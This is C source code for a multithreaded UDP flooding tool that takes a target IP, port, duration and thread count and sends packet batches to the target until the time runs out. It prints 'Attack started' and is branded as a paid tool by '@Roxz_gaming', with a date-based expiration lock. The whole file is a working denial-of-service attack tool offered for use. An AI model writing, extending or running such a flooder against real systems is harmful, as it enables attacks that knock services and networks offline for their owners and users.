#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#define BUFFER_SIZE 200
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 1
#define EXPIRATION_DAY 10

char *ip;
int port;
int duration;
volatile sig_atomic_t stopFlag = 0;

void checkExpiration() {
    struct tm expiration = {0};
    expiration.tm_year = EXPIRATION_YEAR - 1900;  // tm_year is years since 1900
    expiration.tm_mon = EXPIRATION_MONTH - 1;     // tm_mon is 0-based
    expiration.tm_mday = EXPIRATION_DAY;

    time_t now = time(NULL);
    time_t expirationTime = mktime(&expiration);
    
    if (now > expirationTime) {
        fprintf(stderr, "This file is closed by @Roxz_gaming.\n");
        exit(1);
    }
}

void *sendUDPTraffic(void *arg) {
    int userID = *(int *)arg;
    free(arg);
    
    struct sockaddr_in serverAddr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        fprintf(stderr, "User %d: Failed to create socket: %m\n", userID);
        return NULL;
    }

    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &serverAddr.sin_addr) <= 0) {
        fprintf(stderr, "User %d: Invalid IP address: %s\n", userID, ip);
        close(sockfd);
        return NULL;
    }

    char buffer[] = "UDP traffic test";
    time_t endTime = time(NULL) + duration;

    while (time(NULL) < endTime && !stopFlag) {
        for (int i = 0; i < 10; i++) { // Batch sending 10 packets
            if (sendto(sockfd, buffer, sizeof(buffer) - 1, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
                fprintf(stderr, "User %d: Send failed: %m\n", userID);
            }
        }
    }

    close(sockfd);
    return NULL;
}

void *expirationCheckThread(void *arg) {
    while (!stopFlag) {
        checkExpiration();
        sleep(3600); // Check every hour
    }
    return NULL;
}

void signalHandler(int sig) {
    stopFlag = 1;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(1);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    checkExpiration();

    // Print attack parameters
    printf("Attack started\n");
    printf("IP: %s\n", ip);
    printf("PORT: %d\n", port);
    printf("TIME: %d seconds\n", duration);
    printf("THREADS: %d\n", threads);
    printf("File is made by @Roxz_gaming only for paid users.\n");

    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);

    pthread_t expirationThread;
    pthread_create(&expirationThread, NULL, expirationCheckThread, NULL);

    pthread_t *threadIDs = malloc(threads * sizeof(pthread_t));

    for (int i = 0; i < threads; i++) {
        int *userID = malloc(sizeof(int));
        *userID = i;
        pthread_create(&threadIDs[i], NULL, sendUDPTraffic, userID);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(threadIDs[i], NULL);
    }

    free(threadIDs);

    stopFlag = 1;
    pthread_join(expirationThread, NULL);

    return 0;
}
